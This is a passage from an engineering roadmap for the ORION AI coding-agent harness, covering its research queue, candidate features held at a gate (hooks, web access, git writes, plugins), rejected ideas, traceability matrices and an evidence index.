bounded window (done) → clip (done) → evict → summarize → retrieve
```

**Hard rule:** any transformation that affects future execution must remain **attributable and
replay-compatible**. A summarization computed at read time breaks replay; a summarization emitted
as an event with source ids does not.

**Keep Q1 (step evidence as model + runtime) in the research queue** (§17) rather than
implementing it prematurely. It needs designed answers to step windowing, advisory-vs-authoritative
semantics, and re-binding under `plan.revised`. Getting it wrong produces confident wrong
provenance, which is worse than the honest model-declared evidence we have.

---

# PART I — RESEARCH / CANDIDATE / CONDITIONAL / REJECTED

## I.1 Future research queue

Parked ideas with enough substance to design later and enough risk not to bolt on now. An entry
earns its place by naming the **problem it solves** and the **reason it is not being built yet**.

- **Q1 — Step evidence as model + runtime.** Fold model-declared step evidence with runtime-derived
  evidence (mutating `tool.succeeded` in the step window, write witness / edit precondition, verify
  verdict). Same move Wave 1 made for completion, one level down. Blocked on: defining a step's
  window when steps are marked out of order; advisory vs authoritative; re-binding across
  `plan.revised`.
- **Q2 — Per-model planning behaviour.** `qwen3:14b` ignored the plan instruction and edited
  directly; `gemma4-31b` planned five steps and used `verify` unprompted. An **evaluation**
  question, tracked under Track A. Never a README claim.
- **Q3 — Reserved event types.** `child.spawned` / `child.finished` → W10; `context.retrieved` →
  W11. Kept rather than removed because removal breaks replay of existing logs.
- **Q4 — Harness-version provenance.** See W14. Cheap now, unrecoverable later.

---

## I.2 Candidate capabilities — held at the feature-entry gate

Every item here is a capability a competitor has, or a plausible idea, that **has not passed the
§C.6 gate**. None may become a phase until it does. This section exists so that "we considered it"
is recorded, and so the roadmap does not silently become a feature wishlist.

### I.2.1 Lifecycle hooks

**Why it might matter.** Claude Code exposes deterministic lifecycle hooks around tool execution,
session start and end, compaction, model switches and subagent lifecycle. For ORION the shape is
unusually well-matched to the architecture:

```
pre-tool -> policy/hook -> tool -> post-tool -> durable event
```

Unlike a plugin engine or a middleware pipeline — both rejected in §C.5 — a hook at this seam can
remain **attributable to the trajectory**, because the hook's decision is recorded as an event
rather than hidden in an interceptor chain.

**What is missing before it can be a phase.** Execution semantics: does a hook run inside the
authorization decision or after it? Does a hook failure fail the tool call, and is that failure a
`tool.failed` or a new class? Event representation: is a hook invocation an event, and does replay
re-run hooks or reconstruct their recorded decisions — **the answer determines whether hooks break
Invariant 2**. Security: a hook is arbitrary code inside the trust boundary, which the skill design
deliberately avoided (skills are text, never executed). Benchmark and made-to-fail test undefined.

**Investigation trigger.** A measured user problem that hooks solve and existing mechanisms
(permission rules, grants, `verify`) do not. **RECOMMENDATION:** design note before any scheduling,
and the replay question answered first, because it is the one that can disqualify the whole idea.

### I.2.2 LSP and richer code intelligence

**Why it might matter.** Real accuracy uplift on typed languages; OpenCode and Claude Code both
expose some form of it. Carried forward from the W5 edition's "W14+: LSP and richer code
intelligence".

**What is missing.** Whether E5 shows tool-selection or edit-correctness failures that a language
server would actually fix — as opposed to failures of planning or verification. Running an LSP is a
resource with lifecycle and identity (it would be a W6-class resource). Benchmark: B1/B2 uplift,
unmeasured.

**Investigation trigger.** E5 attribution showing a material share of failures are symbol
resolution or type errors that static context would have prevented.

### I.2.3 Web / browser access

**Why it might matter.** A common developer need; every comparator has some form.

**What is missing, and this one is an architectural contradiction, not a gap.** A network-reading
tool inside a `network: none` posture is incoherent. Egress for the *agent* and egress for the
*workspace* are different trust decisions and the current model has one axis. Until that is
designed — probably as a separate capability with its own allowlist and its own grant class — this
cannot be scheduled. Prompt-injection exposure rises sharply: fetched content is untrusted input
that reaches the model.

**Investigation trigger.** A design note resolving the two-axis network model, plus a G-series
benchmark for injection resistance.

### I.2.4 Multimodal context

**Why it might matter.** Codex accepts image context; screenshots are a natural input for UI work.

**What is missing.** No home in the event contract: an image is neither a message clamp nor an
artifact as currently defined. Context budgeting for non-text content is undefined. Replay
determinism with binary content is unexamined.

**Investigation trigger.** A user problem that text cannot express, plus a contract design for
binary content in the bounded projection.

### I.2.5 Plugins and custom agents

**Why it might matter.** Deep Agents, Ruflo and OpenCode all expose plugin ecosystems; it is a
distribution channel.

**What is missing.** A plugin engine is a **new trust boundary**, and §C.5 explicitly rejects
middleware pipelines that mutate state in sequence. It depends on the Grant Store and the sandbox
being able to constrain third-party code. Premature without users.

**Investigation trigger.** External users asking for it, and a design that keeps plugin effects
inside the trajectory.

### I.2.6 MCP server mode (exposing ORION)

**Why it might matter.** Lets other harnesses drive ORION — a distribution channel that costs
little, since the MCP client already exists.

**What is missing.** What a remote caller is allowed to do; how a remote-initiated run's `principal`
is established (depends on P3); resource and grant scoping for a caller that is not a local operator.

**Investigation trigger.** After P3 (principal enforcement) and P5 (server mode) land, this becomes
mostly a surface question.

### I.2.7 Scheduling / cron

**Why it might matter.** Recurring automation; QM and Ruflo both have it.

**What is missing.** It depends entirely on background execution (P8) and on nothing in P8 being
compromised by an unattended trigger. Approval semantics for an unattended run are undefined — a
scheduled run that parks awaiting a human has failed differently from one that errors.

**Investigation trigger.** P8 delivered, plus a demonstrated user problem.

### I.2.8 Model routing policy

**Why it might matter.** Cost control: a cheap model for exploration, a strong one for editing.

**What is missing.** Q2 (per-model planning behaviour) is still an open research question — qwen3
ignored plans, gemma4 planned unprompted. Routing before that is measured would encode an untested
assumption. Provenance already records which model served each turn, so the substrate is ready.

**Investigation trigger.** Q2 resolved, plus E5 cost data showing routing would pay.

### I.2.9 Git write-side contract

**Why it might matter.** Git is **read-only** in ORION (§J.0, W8): the harness reads but cannot
commit. Three held ideas — worktrees (I.2.10), review/PR lifecycle (I.2.11), and restore-via-git
(P5's undo/restore) — all descend from write operations. Competitors treat git writes as a core
surface (Codex worktrees; Aider `/undo`).

**What is missing.** A write is an agent-influenced mutation of state **outside `ORION_HOME`**, in
an arbitrary repository — the same risk class the rest of the plan already disciplines. It needs a
**write contract**: attributable events (`git.commit` / `git.push` / `git.revert`), each
replay-runnable against a pre-state witness; provenance to the deciding model turn; permission /
grant semantics; **revert as a new attributable event, never history mutation**; the P2 merge-back
discipline so parallel children never race one index; and a made-to-fail test that a commit is
byte-reproducible.

**Investigation trigger.** The first real P5 undo/restore item, or a developer asking to commit
from a trajectory. **RECOMMENDATION:** treat this as the *dependency* of I.2.10/I.2.11, not a
competing feature; answer the revert/replay question first, as I.2.1 requires for hooks.

### I.2.10 Worktrees / isolated task workspaces

**Why it might matter.** Codex ships worktree isolation as a first-class choice (Local / Worktree /
Cloud); Bun's agent port runs parallel agents in separate `git worktree`s. A worktree per task is
cheap OS-visible isolation and a natural complement to P2's per-child workspaces.

**What is missing.** Worktrees are a **git write-side** operation — I.2.9 is the dependency; a
worktree's identity and lifecycle as a W6-class resource is undefined; and per-worktree `cwd` per
tool call is a tool-selection seam the contract does not yet express.

**Investigation trigger.** I.2.9 designed, plus a parallel-task need beyond P2's isolation debt.
Held at the gate.

### I.2.11 Review / PR lifecycle

**Why it might matter.** This is the idea that best matches ORION's thesis — reviewability *is*
the product. Codex already ships a trajectory-native review surface (pane, inline comments,
`@codex review` / `@codex fix it`). In ORION terms a review is just another durable trajectory:
comments, findings and fixes as attributable events, and a fix-it cycle as fork-continue.

**What is missing.** PRs live on a forge, so it needs the **git write-side** (I.2.9) and rollback
semantics; comment authorship needs P3's enforced `principal`; and the finding event set
(`review.started`, `finding.created`, `finding.resolved`) needs a contract design. Firing before
real users exist would build review on speculation.

**Investigation trigger.** I.2.9 designed, P3 principal enforced, and a developer actually using
ORION for reviews. Held at the gate.

### I.2.12 Repository map / symbol index

**Why it might matter.** The cheap middle layer between grep/glob and an LSP (I.2.2) — what Aider
uses to keep context selection-oriented: "where is X and what touches it" without spawning
language servers.

**What is missing.** Whether E5 failures are navigation/symbol failures rather than planning or
verification failures is **unmeasured**; a map is stale data unless refreshed, and staleness has a
cost; a map is a W6-class resource with lifecycle.

**Investigation trigger.** E5 attribution showing a material share of failures are
symbol-resolution or search-cost failures. Same trigger as I.2.2 — the map is the cheaper candidate
to try first. Held at the gate.

### I.2.13 Custom tools and commands

**Why it might matter.** Every serious harness allows user-defined tools/commands (Claude Code
slash commands, OpenCode custom tools). Of the hooks/plugins/commands family it is the closest to
the trust boundary and therefore what users most plausibly need first.

**What is missing.** A user-defined tool is arbitrary code **inside the trust boundary** — the
exact risk the skill design avoided by making skills text, *never executed*. It needs a G-series
security benchmark, sandbox/container execution, permission semantics, and an event representation
that keeps the invocation attributable. None of I.2.1 / I.2.5 / I.2.13 can pass §C.6 until the
custom-code boundary is designed.

**Investigation trigger.** A user problem that configured tools solve and built-ins/skills do not,
plus the custom-code boundary design. Held at the gate.

### I.2.14 IDE integration

**Why it might matter.** Every major competitor has an editor surface (Codex extensions, Claude
Code integrations, OpenCode IDE). Harness decisions are often made in the editor.

**What is missing.** Most of the value arrives free once P5 ships server/API mode and the durable
trajectory format — an IDE becomes a **projection**. The only design risk is the invariant's edge:
the IDE must never become an execution authority or a second source of truth — a viewer that
renders a trajectory, nothing more.

**Investigation trigger.** P5 server mode exists and any developer asks for it. Held at the gate —
do not precede P5's stable surface.


## I.3 Explicitly rejected or deferred

| Idea | Decision | Reason |
|---|---|---|
| Rebuild compaction | **REJECTED** | Implemented, deterministic, tested |
| Build a new interactive CLI | **REJECTED** | REPL exists and works |
| Workflow engine for planning | **REJECTED** | Smallest useful abstraction only |
| Marketplace for skills | **REJECTED** | Out of scope |
| Autonomous self-modification | **REJECTED** | Violates reviewability |
| Claiming OS isolation before W6 | **REJECTED** | Path containment ≠ isolation |
| Storing model reasoning / hidden CoT | **REJECTED** | Store execution metadata and evidence only |
| Middleware pipeline architecture | **REJECTED** | Hidden mutable state (§1.4) |
| Mutable transcript / history rewriting | **REJECTED** | Violates Invariant 1 |
| Resource identity as a mutable column | **REJECTED** | TrueForge's shape; competing truth (§9.3) |
| JS → TS source rewrite | **REJECTED** | §15 |
| Node → Python / hybrid runtime | **REJECTED** | §15 |
| Vercel AI SDK for provider breadth | **DEFERRED** | Large dependency for an unreported need |
| Vector DB for memory | **DEFERRED** | Measure retrieval need first |
| Broad provider catalog | **DEFERRED** | Fix the seam before adding integrations |
| Multi-tenancy | **DEFERRED → W14** | Columns exist, unenforced; no demand |
| LSP / full code intelligence | **DEFERRED → W14+** | ORION is not an IDE |
| Postgres now | **DEFERRED → W14** | Incremental backend, not a rewrite |
| Implementing all six repos' features | **REJECTED** | Prior art, not a backlog |

---

# PART J — PRESERVATION AND TRACEABILITY MATRIX

**Purpose.** Prove that nothing significant disappeared in the re-chart. Every item from the
previous edition's future work is classified as exactly one of: **HISTORICAL COMPLETED · RETAIN ·
MOVE · MERGE · EXPAND · CONDITIONAL · RESEARCH · EXPLICITLY REJECTED**, with a reason for anything
that is not a straight RETAIN.

## J.0 Old wave → new phase traceability

| Old wave / item | Disposition | Now at | Reason |
|---|---|---|---|
| W0 public artifact validation | HISTORICAL COMPLETED | §A.1 | executed 2026-09-04 |
| W1 truthful completion | HISTORICAL COMPLETED | §A.1 | `00b68a6` |
| W2 planning + verification | HISTORICAL COMPLETED | §A.1 | `9de5324` |
| W3 context maturity + artifacts | HISTORICAL COMPLETED | §A.1 | `0baf4b4`; compaction debt → D5 → **P6** |
| W4a/W4b providers + streaming | HISTORICAL COMPLETED | §A.1 | `1be187a`, `c8b106f` |
| W4.5 ship safety | HISTORICAL COMPLETED | §A.1 | `ee41579` |
| W5 foundation hardening | HISTORICAL COMPLETED | §A.1 | Store boundary enables P12a |
| W6 execution environment + resource identity + Recovery 2.0 | HISTORICAL COMPLETED | §A.1, §F.1 | `681be8b` |
| **W6-M Grant Store** | HISTORICAL COMPLETED | §A.1, §C.3.2, §F.4 | shipped as an event-derived projection; benchmark coverage → **D.2 S1–S7** |
| W6.1 live proofs | HISTORICAL COMPLETED | §A.1 | `bc9e2f6`, `c8c91ee` |
| W7 skills + project context | HISTORICAL COMPLETED | §A.1 | `afde869` |
| W8 search + git + config | HISTORICAL COMPLETED | §A.1 | git is read-only; **write-side contract → I.2.9** |
| W9 MCP + external resources | HISTORICAL COMPLETED | §A.1 | `682b345` |
| W10 subagents + parallel execution | HISTORICAL COMPLETED | §A.1 | `93703bd`, `b2a84ce`; isolation debt → D1 → **P2** |
| **W11 memory + retrieval** | MOVE + CONDITIONAL | **P6** | preserved in full: working/project/team memory, retrieval, `context.retrieved`, provenance, attribution, retrieval visibility, deletion/retention semantics, trajectory linkage, isolation, replay-compatible context evolution, memory-as-derived-claim. **Conditional** because retrieval demand is unmeasured (K0 is the gate) and compaction has never fired (D5) |
| **W12 trajectory UX + SDK + API** | MOVE + EXPAND | **P5** | preserved in full and expanded with TUI, live streaming, steering, interruption, queued prompts, approval UX, degraded-state UX, cost display, import. Promoted to **unconditional** — it is the difference between the moat existing and mattering |
| **W13 production operations** | MOVE | **P11** | preserved in full: backup/restore, retention, artifact GC, archival, structured logging, metrics, tracing seam, health/readiness, diagnostics, E3, load/soak/security/upgrade tests, release verification, rollback. Exit = Level 3 |
| **W14a scale** | MOVE + CONDITIONAL | **P12a** | preserved in full: Postgres behind the unchanged Store API, queueing, rate limiting, idempotency, leader coordination, object storage, multi-tenancy, quotas. Demand-gated; the option costs nothing because W5 bound the SQL |
| **W14b team learning** | MOVE + RESEARCH | **P12b** | preserved in full: trajectory → patterns → proposed change → review → version → measurement → accept/reject; attributable, inspectable, versioned, reviewable, reversible, measurable; no autonomous self-modification. Remains RESEARCH — §C.3.4 records it as a hypothesis with no evidence |
| **W14 two provenance additions** (harness version, principal) | MOVE + PROMOTE | **P3** | promoted from a W14 footnote to its own early phase because both are **unrecoverable later** |
| **W14+ LSP** | MOVE to candidates | **I.2.2** | fails the §C.6 gate today: no evidence E5 failures are symbol/type resolution |
| Background execution | MOVE | **P8** | moved out of operations into execution/autonomy because it changes execution semantics — leases, fencing, cancellation, resources, quotas, recovery |
| Provider resilience (retry/rotation/watchdog) | EXPAND | **P1** | was implicit; now first, because four provider defects escaped the suite and a 429 killed a wave gate |
| Live-provider testing | **ADD** | **P1** | not in the previous edition at all. §B.4 shows no automated assertion calls a real model |
| Child isolation / per-child caps | **ADD** | **P2** | created by W10 shipping parallelism first |
| E5 frontier benchmark | **ADD** | **D.3 / P4** | new |
| E6 harness attribution | **ADD** | **D.4 / P10** | new — isolates harness contribution from model capability |
| Human-effort metrics | **ADD** | **D.5** | machine-observable from E5; human study gated on product + users |
| External benchmark ladder | **ADD** | **D.6** | reference only, never comparability claims |
| Hooks | **ADD to candidates** | **I.2.1** | genuine omission from both report sets; held at the gate pending the replay question |
| Web/browser, multimodal, plugins, MCP server mode, scheduling, model routing | **ADD to candidates** | **I.2.3–I.2.8** | each fails at least one §C.6 question today |
| Q1 step evidence · Q2 per-model planning · Q3 reserved types | RETAIN | **I.1** | Q3 partially resolved: `child.*` emitted by W10; only `context.retrieved` remains |
| Subjective 1–10 maturity table | **EXPLICITLY REJECTED** | removed, §C.8 | unfalsifiable and gameable; replaced by hard gates and measured values |
| Maturity ladder Level 0–5 | RETAIN | **§C.9** | still useful; Level 3 is P11's exit criterion |
| Workflow engine | **EXPLICITLY REJECTED** | §I.3 | rejection stands; P8 delivers structured delegation, not orchestration |
| Wholesale JS→TS or Node→Python rewrite | **EXPLICITLY REJECTED** | §H.1 | no evidence justifies it |

## J.1 Capability preservation checklist

Every capability named in the commissioning brief's preserve-list, and where it now lives:

| Capability | Status | Location |
|---|---|---|
| Durable trajectory | shipped | §C.1, Invariant 1 |
| Plan projection | shipped | §A.1 W2 |
| Artifacts | shipped | §A.1 W3 |
| Context / provenance | shipped | §A.1 W3/W4 |
| Provider abstraction | shipped; resilience → **P1** | §B.5 |
| Streaming | shipped | §A.1 W4b |
| Truthful completion | shipped; published as a number → **P7** | ADR-013, §C.3.3 |
| Replay | shipped | Invariant 2 |
| Fork | shipped | §B.5 |
| Recovery (effect-aware) | shipped | ADR-002/003/011 |
| Fencing | shipped | Invariant 4; **not a differentiator** (§C.3.4) |
| Sandboxing | shipped; per-child caps → **P2** | §F.1 |
| Resource identity | shipped | §F.1 |
| **Grant Store** | shipped; benchmarks → **D.2 S1–S7** | §C.3.2, §F.4 |
| Project instructions | shipped | §A.1 W7 |
| Skills | shipped | §A.1 W7 |
| MCP | shipped; server mode → **I.2.6** | §A.1 W9 |
| Subagents | shipped | §A.1 W10 |
| Parallelism | shipped; isolation → **P2**, background children → **P8** | §B.6 D1 |
| Background execution | → **P8** | §E |
| Cancellation | shipped (`run.parked`, X5) | §B.5 |
| Memory / retrieval | → **P6**, conditional | §E |
| Sessions / turns | shipped | §B.5 |
| Trajectory UX | → **P5** | §E |
| SDK / API | → **P5** | §E |
| Observability | → **P5** (trajectory) + **P11** (operational) | §E |
| Operator controls | → **P11** | §E |
| Production scaling | → **P12a**, demand-gated | §E |
| LSP / code intelligence | → **I.2.2**, candidate | §I |
| Web / browser | → **I.2.3**, candidate | §I |
| Multimodal | → **I.2.4**, candidate | §I |
| Hooks / extensions / plugins | → **I.2.1 / I.2.5**, candidates | §I |
| Git write-side contract | → **I.2.9**, candidate (dependency of worktrees / review / restore-via-git) | §I |
| Worktrees | → **I.2.10**, candidate | §I |
| Review / PR lifecycle | → **I.2.11**, candidate | §I |
| Repository map / symbol index | → **I.2.12**, candidate | §I |
| Custom tools / commands | → **I.2.13**, candidate | §I |
| IDE integration | → **I.2.14**, candidate | §I |
| Persistent background shell processes | → **P8** (process-lifecycle scope item) | §E |
| Operating modes (`ask/plan/code/review`) | → **P5** (policy-gate modes) | §E |
| Undo / restore | → **P5** (trajectory product, attributable restore) | §E |
| Eval as product | → **P5** (public surface, gated post-E5) | §E |

**Nothing from the previous edition's future work has been deleted.** Items that moved to
candidates (LSP, and the newly proposed capabilities) are held by the §C.6 gate, not discarded, and
each carries an investigation trigger.


## J.2 Preservation matrix — carried forward verbatim from the W5 edition

> Retained as the historical record of what the previous rebaseline decided. Current dispositions
> are §J.0 and §J.1.

Every major capability from the previous plan, with its disposition. **No capability was removed.**

| Existing capability / wave | Prior status | Revised wave | Decision | Reason |
|---|---|---|---|---|
| Wave 1 — truthful completion | proposed | **W1 (done)** | **KEEP — historical** | Shipped, verified |
| Wave 1 — lease heartbeat (D1) | proposed | **W1 (done)** | **KEEP** | Shipped; tool-path gap → W5 (X2) |
| Wave 1 — provider shims (D3) | proposed | **W1 (done)** | **KEEP** | Shipped, auto-detect |
| Wave 1 — `verify` tool | proposed | **W1 (done)** | **KEEP** | Shipped; F1 hardened in 4.5 |
| Wave 1 — dead vocabulary | proposed | **W1 (done)** | **KEEP** | `turn.finished` emitted; 3 reserved |
| Wave 2 — planning | proposed | **W2 (done)** | **KEEP** | `plan.*` as a fold |
| Wave 2 — replanning | proposed | **W2 (done)** | **KEEP** | `plan.revised` |
| Wave 2 — T1/T2/T3 recovery tests | proposed | **W2 (done)** | **KEEP** | In suite |
| Wave 3 — context maturity | proposed | **W3 (done)** | **KEEP + EXTEND** | Budget-aware; ladder → W11 |
| Wave 3 — artifacts | proposed | **W3 (done)** | **KEEP — do not redesign** | Best artifact model in the corpus |
| Wave 4a — provider abstraction | proposed | **W4a (done)** | **KEEP** | Seam falsified with Anthropic |
| Wave 4a — request provenance | proposed | **W4a (done)** | **KEEP** | Digest, host-only |
| Wave 4a — credential redaction | proposed | **W4a (done)** | **KEEP** | Scrubbed at write time |
| Wave 4b — streaming | proposed | **W4b (done)** | **KEEP** | Durable partial execution |
| Wave 4.5 — security/wiring | unplanned | **W4.5 (done)** | **KEEP** | F1/F3/F4/F5 |
| **Wave 5 — Resource identity** | Wave 5 | **W6 (part C/D/H/I)** | **MERGED, PRESERVED** | See §9 — resource identity is inseparable from the boundary it binds to |
| **Wave 5 — Recovery 2.0** | Wave 5 | **W6 (part I/J)** | **MERGED, PRESERVED** | See §9 — full disposition |
| Wave 6 — Skills | Wave 6 | **W7** | **SPLIT + PROMOTED** | Low risk, no new trust boundary, immediate value |
| Wave 6 — MCP | Wave 6 | **W9** | **SPLIT + DEFERRED** | Third-party code + network must land behind isolation |
| Wave 7 — Subagents | Wave 7 | **W10** | **KEEP, reordered** | Needs resources (W6) and scope model |
| Wave 8 — Memory | Wave 8 | **W11** | **KEEP, deferred** | Contract change; retrieval need still unmeasured |
| Wave 9 — Trajectory UX / SDK | Wave 9 | **W12** | **KEEP, expanded** | Now also API/server mode, export, types |
| Wave 10 — Sandbox maturity | Wave 10 "independent" | **W6** | **PROMOTED + MERGED** | Reclassified: table stakes and the autonomy gate |
| Wave 11 — Team learning | Wave 11 | **W14** | **KEEP — research only** | Unchanged; still gated on real usage |
| Search / glob | *absent from prior plan* | **W8** | **ADDED** | Measured contributor to run failures |
| Project instructions | *absent* | **W7** | **ADDED** | Universal convention; ORION has none |
| Config file / rule file | *absent* | **W8** | **ADDED** | Product-surface gap |
| Foundation hardening | *absent* | **W5** | **ADDED** | Prior plan had no home for migrations/Store/async |
| Production operations | *absent* | **W13** | **ADDED** | Prior plan assumed these emerge from feature waves |
| **Grant store / approval memory (W6-M)** | **removed in 09-07 rebaseline** | **W6 (M)** | **RESTORED (2026-09-08 amendment)** | Security/autonomy subsystem, required — see §13, §10.2 W6-M |
| Git integration | *absent* | **W8** | **ADDED** | Table stakes |
| LSP / code intelligence | *absent* | **W14+** | **ADDED, deferred** | Explicitly not becoming an IDE |
| Parallel execution | implicit in W7 | **W10** | **EXPANDED** | Concurrency + contention design, not "more processes" |
| Cancellation | *absent* | **W5** | **ADDED** | Defect X5 |
| Retention / GC | *absent* | **W13** | **ADDED** | Defect G1/G2 |
| Postgres backend | deferred | **W14** | **KEEP deferred, now enabled** | W5's Store boundary makes it incremental |

**Removed: nothing.** No capability from the previous plan is absent from this one.

---

# PART K — EVIDENCE INDEX

## K.0 Provenance of the 14 audit reports — a caveat that must be recorded

This edition reconciles fourteen reports: seven under `research/claude-audit/` and seven under
`research/opencode/`. They were commissioned as two independent analyses, and their convergence
is cited in several places above.

**That independence is not fully established, and the plan should not lean on it.** FACT: the
Claude set was written 11:20–11:44 on 2026-09-18 and was then moved into `research/opencode/`,
where it sat until ~12:05. The OpenCode set was written 12:00–12:03 — inside that window. Whether
the second set was informed by the first is **UNKNOWN — NOT YET MEASURED**.

**Consequence for how the convergence is used.** Where the two sets agree on a fact read from
source (contract v6/49, the dead-endpoint finding, the Hermes fencing correction), the agreement
adds nothing beyond the source itself — and this plan cites the source, not the agreement. Where
they agree on a *judgement*, that agreement is recorded as one opinion held twice, not as
corroboration.

**RECOMMENDATION:** if independent cross-checking is wanted in future, give each stream a separate
output directory that the other cannot read, and record the write window.


## K.1 Evidence index

**ORION reports:** `wave1-report.md` · `wave2-report.md` · `wave3-report.md` · `wave4-report.md` ·
`wave4_5-ship-safety-report.md` · `wave5-prompt.md` · `future-queue.md`

**ORION audits:** `ORION-PRODUCTION-COMPETITIVE-AUDIT.md` ·
`ORION-DEEP-COMPARATIVE-ARCHITECTURE-AUDIT.md`

**ORION contracts:** `event-log-contract.md` · `tool-contract.md` · `provider-contract.md` ·
`recovery-contract.md` · `security-contract.md` · `cli-contract.md` · `public-api.md`

**ADRs (13):** 001 bounded projection · 002 per-invocation recovery · 003 self-verifying tools ·
004 extensible event payloads · 005 recovery granularity · 006 no-progress · 007 replay vs rerun ·
008 execution fencing · 009 paused runs are claimable · 010 client retries are degradations ·
011 write pre-state witness · 012 read line-number delimiter · 013 declared completion contract

**Source (key):** `core/run/store.mjs` · `core/event/index.mjs` · `core/projection/{index,compact,
plan,artifacts}.mjs` · `core/recovery/index.mjs` · `core/replay/index.mjs` · `core/lease/reaper.mjs`
· `agent/loop/worker.mjs` · `agent/tools/index.mjs` · `agent/model/{index,anthropic,stream}.mjs` ·
`auth/default/index.mjs` · `sandbox/local/index.mjs` · `cli/index.mjs` · `src/index.mjs`

**Measurements:** `v0/benchmarks/results-normal.json` · `results-full.json` · `v0/tests/*.json`

**Six-repository research:** `research/corpus/SIX-REPOSITORY-MANIFEST.md` ·
`SIX-REPOSITORY-EXPANSION.md` · clones at `research/repos/{qm,hermes-agent,ruflo,open-harness,
trueforge,deepagents}`

**Competitor sources:** Claude Code sandboxing/permissions docs · codex-rs architecture analyses ·
OpenCode storage and session-management documentation

---

## STOP — PLAN RE-CHARTED. NO IMPLEMENTATION PERFORMED.

`v0/src` unmodified · `v0/tests` unmodified · `package.json` unmodified · event contract unchanged
at v6/49 · no version change · nothing published · no defect fixed by this document.

**This edition re-charts post-W10 development.** W0–W10 are preserved as historical record
(Part A). Every old W11–W14 capability is preserved and mapped (Part J). Subjective maturity
scores are removed in favour of hard gates and measured values (Part D).

**Next action requires explicit approval: P0 — commit the three pending shipped fixes and pin the
measurement baseline SHA (CONDITION B1).**
